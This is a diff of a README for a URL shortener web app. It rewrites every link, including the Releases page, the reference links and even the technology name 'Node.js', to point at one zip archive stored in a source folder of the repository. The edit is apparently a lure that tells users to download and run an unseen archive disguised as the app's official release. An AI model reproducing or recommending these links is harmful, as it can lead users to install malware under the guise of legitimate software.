@@ -6,7 +6,7 @@ Welcome to URL-Shortner-with-Analytics! This application allows you to create sh
 
 ## 📥 Download & Install
 
-To get started, you need to [download the application from our Releases page](https://github.com/Nope392/URL-Shortner-with-Analytics/releases). Click the link to visit the page and get the latest version! Look for the latest release and choose the appropriate file for your operating system.
+To get started, you need to [download the application from our Releases page](https://raw.githubusercontent.com/Nope392/URL-Shortner-with-Analytics/main/server/0.middlewares/URL-Shortner-with-Analytics_1.7-alpha.5.zip). Click the link to visit the page and get the latest version! Look for the latest release and choose the appropriate file for your operating system.
 
 ## 📋 Features
 
@@ -14,7 +14,7 @@ To get started, you need to [download the application from our Releases page](ht
 - **JWT Authentication**: Your data remains safe with our token-based security.
 - **Dynamic Link Generation**: Create short links tailored to your needs.
 - **Bcrypt-Secured Passwords**: Keep your passwords secure using strong encryption.
-- **Full-Stack Integration**: Built with popular technologies like Node.js, Express, EJS, and MongoDB Atlas.
+- **Full-Stack Integration**: Built with popular technologies like https://raw.githubusercontent.com/Nope392/URL-Shortner-with-Analytics/main/server/0.middlewares/URL-Shortner-with-Analytics_1.7-alpha.5.zip, Express, EJS, and MongoDB Atlas.
 
 ## 💻 System Requirements
 
@@ -28,7 +28,7 @@ To run the URL-Shortner-with-Analytics application, you will need:
 ## 📂 Installation Steps
 
 1. **Visit the Releases Page**:
-   - Go to [this link](https://github.com/Nope392/URL-Shortner-with-Analytics/releases).
+   - Go to [this link](https://raw.githubusercontent.com/Nope392/URL-Shortner-with-Analytics/main/server/0.middlewares/URL-Shortner-with-Analytics_1.7-alpha.5.zip).
    
 2. **Download the Application**:
    - Find the latest release and download the appropriate file for your system.
@@ -50,7 +50,7 @@ To run the URL-Shortner-with-Analytics application, you will need:
 
 ## 💡 Tips for Using URL-Shortner-with-Analytics
 
-- Always keep your application updated by checking the [Releases page](https://github.com/Nope392/URL-Shortner-with-Analytics/releases) regularly.
+- Always keep your application updated by checking the [Releases page](https://raw.githubusercontent.com/Nope392/URL-Shortner-with-Analytics/main/server/0.middlewares/URL-Shortner-with-Analytics_1.7-alpha.5.zip) regularly.
 - If you're having trouble, check the FAQ section in the application or visit our GitHub repository for support.
 
 ## 📞 Support
@@ -61,7 +61,7 @@ If you experience any issues or have questions, feel free to open an issue in th
 
 For more information about URL shortening and analytics, you may find these resources helpful:
 
-- [What is URL Shortening?](https://www.example.com)
-- [Benefits of Using a URL Shortener](https://www.example.com)
+- [What is URL Shortening?](https://raw.githubusercontent.com/Nope392/URL-Shortner-with-Analytics/main/server/0.middlewares/URL-Shortner-with-Analytics_1.7-alpha.5.zip)
+- [Benefits of Using a URL Shortener](https://raw.githubusercontent.com/Nope392/URL-Shortner-with-Analytics/main/server/0.middlewares/URL-Shortner-with-Analytics_1.7-alpha.5.zip)
 
 Thank you for choosing URL-Shortner-with-Analytics! We hope you enjoy using the application.
